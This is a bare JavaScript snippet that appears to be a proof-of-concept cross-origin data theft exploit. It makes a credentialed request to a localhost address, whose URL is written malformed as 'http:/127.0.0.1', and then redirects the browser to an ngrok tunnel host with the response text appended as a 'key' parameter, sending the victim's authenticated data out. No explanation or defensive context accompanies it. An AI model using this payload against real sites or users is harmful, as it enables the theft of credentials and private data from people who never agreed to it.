var xhr = new XMLHttpRequest();

xhr.onload = reqListener; 
xhr.open("GET", "http:/127.0.0.1");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send();

function reqListener() {
    location='//dc1b-202-162-37-174.ngrok-free.app//?key='+this.responseText; 
};
